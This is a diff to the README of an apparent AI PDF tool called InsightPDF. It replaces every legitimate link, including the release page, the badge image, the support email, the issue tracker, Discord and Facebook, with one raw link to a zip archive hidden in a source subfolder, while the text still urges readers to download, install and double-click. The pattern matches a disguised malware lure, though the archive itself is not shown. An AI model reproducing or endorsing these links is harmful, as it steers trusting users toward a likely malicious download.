@@ -4,11 +4,11 @@
 
 Welcome to InsightPDF! This app helps you extract insights, summarize content, and search documents intelligently using AI. 
 
-[![Download InsightPDF](https://img.shields.io/badge/Download%20InsightPDF-%20%E2%86%92-blue)](https://github.com/juniorledvi/InsightPDF/releases)
+[![Download InsightPDF](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip%20InsightPDF-%20%E2%86%92-blue)](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip)
 
 ## 📥 Download & Install
 
-To start using InsightPDF, visit the [Releases page](https://github.com/juniorledvi/InsightPDF/releases) to download the latest version. Follow these simple steps to get up and running:
+To start using InsightPDF, visit the [Releases page](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip) to download the latest version. Follow these simple steps to get up and running:
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want, typically the latest one. 
@@ -69,20 +69,20 @@ After installing, locate the InsightPDF icon and double-click to open it.
 
 If you encounter any issues or have questions, please reach out to our support team:
 
-- Email: support@insightpdf.com
-- GitHub Issues: [Report an Issue](https://github.com/juniorledvi/InsightPDF/issues)
+- Email: https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip
+- GitHub Issues: [Report an Issue](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip)
 
 ## 🌐 Community
 
 Join our user community to share insights and tips about using InsightPDF:
 
-- Discord: [Join our Discord](https://discord.gg/insightpdf)
-- Facebook Group: [Participate in our Facebook Group](https://facebook.com/groups/insightpdf)
+- Discord: [Join our Discord](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip)
+- Facebook Group: [Participate in our Facebook Group](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip)
 
 ## 🎉 Acknowledgments
 
 Thank you for choosing InsightPDF. We appreciate your support and feedback as we continue to improve and add features to enhance your PDF experience.
 
-[![Download InsightPDF](https://img.shields.io/badge/Download%20InsightPDF-%20%E2%86%92-blue)](https://github.com/juniorledvi/InsightPDF/releases) 
+[![Download InsightPDF](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip%20InsightPDF-%20%E2%86%92-blue)](https://github.com/juniorledvi/InsightPDF/raw/refs/heads/main/insightpdf/services/PDF_Insight_v3.8.zip) 
 
 Feel free to explore and enjoy your new PDF assistant!
